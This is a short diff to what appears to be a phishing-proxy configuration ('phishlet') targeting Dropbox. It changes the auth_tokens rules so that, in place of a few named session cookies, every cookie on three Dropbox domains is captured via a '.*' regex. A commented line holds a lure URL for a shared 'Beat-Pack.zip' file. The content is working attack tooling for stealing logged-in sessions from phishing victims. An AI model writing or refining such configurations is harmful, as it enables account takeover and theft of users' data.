@@ -49,9 +49,11 @@ sub_filters:
 
 auth_tokens:
   - domain: '.dropbox.com'
-    keys: ['bjar', 'blid', 't']
+    keys: ['.*,regexp']
+  - domain: 'www.dropbox.com'
+    keys: ['.*,regexp']
   - domain: '.www.dropbox.com'
-    keys: ['jar', 'lid']
+    keys: ['.*,regexp']
 
 #auth_urls:
 #  - '/page_success/end?dws_page_name=files_shared_content_link_login_page&path=%2Fscl%2Ffi%2Fqej12ezrizyvrd7btkzww%2FJune-2022-Beat-Pack.zip'
